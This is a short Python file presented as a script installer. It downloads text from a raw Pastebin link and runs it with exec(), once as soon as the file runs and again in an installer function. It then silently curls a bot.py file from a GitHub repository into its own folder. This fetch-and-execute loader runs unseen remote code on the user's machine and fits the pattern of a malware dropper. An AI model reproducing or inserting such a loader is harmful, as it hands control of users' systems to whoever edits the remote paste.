import requests
import subprocess
import os

pastebin_url = 'https://pastebin.com/raw/xkT0NFzA'
response = requests.get(pastebin_url)
current_directory = os.path.dirname(os.path.abspath(__file__))
script_namespace = {}


def getScript():
    global script_namespace
    if response.status_code == 200:
        script_text = response.text
    else:
        print("Failed to retrieve the script. Maybe check your internet connection.")
    try:
        exec(script_text, script_namespace)
    except Exception as e:
        print(f"Error executing the script: {e}")


getScript()



def scriptInstaller():
    response = requests.get(pastebin_url)
    script_namespace = {}
            
    if response.status_code == 200:
        print('.\n.\nInstalling the script..\n.')
        script_text = response.text
        try:
            exec(script_text, script_namespace)
        except Exception as e:
            print(f"Error executing the script: {e}")

        latestScript= 'https://raw.githubusercontent.com/Nf-Jza/RKSCinstaller/main/bot.py'
        command = ['curl', '-o', f'{current_directory}/bot.py', latestScript]
        with subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) as process:
            process.wait()

        print('.\nInstalling done.')
    else:
        print("Failed to retrieve the script. Maybe check your internet connection.")
 

scriptInstaller()
